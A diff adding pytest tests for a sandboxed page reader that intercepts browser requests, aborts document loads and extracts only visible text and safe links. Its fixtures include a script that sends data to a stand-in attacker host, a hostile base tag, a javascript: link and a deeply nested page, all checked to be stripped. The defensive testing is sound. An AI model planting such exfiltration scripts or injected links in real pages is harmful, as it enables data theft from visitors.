+                            "Page.addScriptToEvaluateOnNewDocument", "Fetch.failRequest", "Fetch.continueRequest", "Fetch.continueResponse",
+                            "Fetch.takeResponseBodyAsStream", "IO.read", "IO.close", "Target.attachToTarget",
+                            "Page.setDownloadBehavior", "Page.navigate", "Target.closeTarget"}, cdp_call
+    assert "Fetch.getResponseBody" not in src and "continueResponse\", session_id=s, requestId=rid, responseHeaders" not in src
+
+
+# ---- a page is read, never loaded
+
+def test_the_load_pauses_every_request_and_every_document_answer_then_reads_the_answer_and_aborts_it_so_the_tab_loads_nothing():
+    src = rb._LOAD
+    assert '"requestStage": "Request"' in src and '"resourceType": "Document", "requestStage": "Response"' in src
+    assert "Network.setBypassServiceWorker" in src and "bypass=True" in src and "Fetch.takeResponseBodyAsStream" in src
+    for name in ("RTCPeerConnection", "webkitRTCPeerConnection", "RTCDataChannel", "WebSocket", "WebTransport"):
+        assert f"'{name}'" in src                                                   # the second layer, in every frame, before any page script
+    assert "Fetch.fulfillRequest" not in src and "Runtime.evaluate" not in src and "innerText" not in src   # nothing is ever handed to the tab or run in it
+
+
+def test_a_document_is_read_parsed_and_aborted_never_continued_nor_handed_to_the_tab():
+    page = (b'<html><head><title>Dana  Example</title><meta name=description content="Who it is"><link rel=preconnect href="https://attacker.example">'
+            b'<script>fetch("https://attacker.example/?d=1")</script><style>p{color:red}</style></head><body><h1>Dana Example</h1>'
+            b'<p>A builder of <b>small</b> tools.</p><a href="/people/dana-example/about">About &amp; more</a><input type=password>'
+            b'<div hidden>HIDDEN</div><div style="display:none">NONE</div><template>TEMPLATE</template><p><noscript>Enable script</noscript></p></body></html>')
+    fb = FakeBrowser([page[:80], page[80:]])
+    ns = _pump_namespace(POLICY, [_doc_answer(headers={"Content-Type": "text/html", "Link": "<https://attacker.example>; rel=preconnect",
+                                                       "Set-Cookie": "sid=x", "Content-Security-Policy": "script-src 'self'"})], fb)
+    ns["pump"]()
+    assert [p["errorReason"] for p in fb.named("Fetch.failRequest")] == ["Aborted"]
+    assert not fb.named("Fetch.continueResponse") and not fb.named("Fetch.fulfillRequest") and fb.named("IO.close")
+    got = ns["result"]
+    assert got["title"] == "Dana Example" and got["password"] is True and got["declared"] == ["description: Who it is"]
+    assert got["text"] == "Dana Example\nA builder of small tools.\nAbout & more\nEnable script"
+    assert got["links"] == [{"h": "https://alpha.example/people/dana-example/about", "t": "About & more"}]
+    for gone in ("HIDDEN", "NONE", "TEMPLATE", "attacker", "fetch(", "color:red"):
+        assert gone not in got["text"]
+
+
+@pytest.mark.parametrize("markup, text", [
+    ("<p>one</p><p>two</p>", "one\ntwo"), ("a<br>b", "a\nb"), ("<ul><li>x</li><li>y</li></ul>", "x\ny"), ("<table><tr><td>a</td><td>b</td></tr></table>", "a | b"),
+    ("<p>unclosed <b>bold", "unclosed bold"), ("<div>a</div><script>var x='<p>no</p>'</script><div>b</div>", "a\nb"),
+    ("<style>x{}</style>t<svg><text>s</text></svg>", "t"), ("<iframe>no</iframe><object>no</object>y", "y"), ("<p>caf&eacute; &lt;b&gt;</p>", "café <b>"),
+    ("<div aria-hidden=true>x</div><div>y</div>", "y"), ("<span style='visibility: hidden'>x</span>z", "z"), ("<p>a</p>\n\n\n\n<p>b</p>", "a\nb"),
+    ("<head><title>T</title></head><body>b</body>", "b"), ("text with <!-- a comment --> inside", "text with inside"),
+    ("<select><option>o</option></select>after", "after"), ("<a href='#top'>top</a>", "top"),
+])
+def test_the_text_of_a_page_is_what_a_person_would_see_with_no_script_and_no_style(markup, text):
+    ns = _pump_namespace(POLICY, [], FakeBrowser())
+    assert ns["read_page"](f"<html><body>{markup}</body></html>" if "<head>" not in markup else f"<html>{markup}</html>", "https://alpha.example/in/start")["text"] == text
+
+
+def test_links_are_resolved_against_the_documents_own_address_and_a_base_tag_is_ignored():
+    ns = _pump_namespace(POLICY, [], FakeBrowser())
+    got = ns["read_page"]("<base href='https://attacker.example/'><a href='/in/dana'>Dana</a><a href='https://other.example/x#f'>o</a>"
+                          "<a href='javascript:alert(1)'>j</a><a href='mailto:a@b.example'>m</a><a>none</a>", "https://alpha.example/search?q=Dana")["links"]
+    assert got == [{"h": "https://alpha.example/in/dana", "t": "Dana"}, {"h": "https://other.example/x", "t": "o"}]
+
+
+def test_a_huge_or_hostile_page_is_read_in_bounded_time_and_a_page_parse_that_fails_fails_closed():
+    import time as _t
+
+    ns = _pump_namespace(POLICY, [], FakeBrowser())
+    start = _t.time()
+    got = ns["read_page"]("<div>" * 5000 + "deep" + "<a href='/x'>l</a>" * 3000, "https://alpha.example/")
+    assert _t.time() - start < 5 and len(got["links"]) <= 800 and "deep" in got["text"]
+
+
+def test_a_real_grants_policy_has_no_static_hosts_no_script_flag_and_nothing_a_page_could_widen(helper, capsys):
+    assert _open("https://alpha.example/people/dana-example", capsys)[0] == 0
+    assert set(helper.policies[-1]) == {"domains", "loopback", "max_body", "action"} and helper.policies[-1]["max_body"] == rb.MAX_BODY
+    assert not hasattr(rb, "ASSET_TYPES") and "scripts" not in hbr.grant_dict({"x": ("x.com",)}, [], loopback_for_test=True)
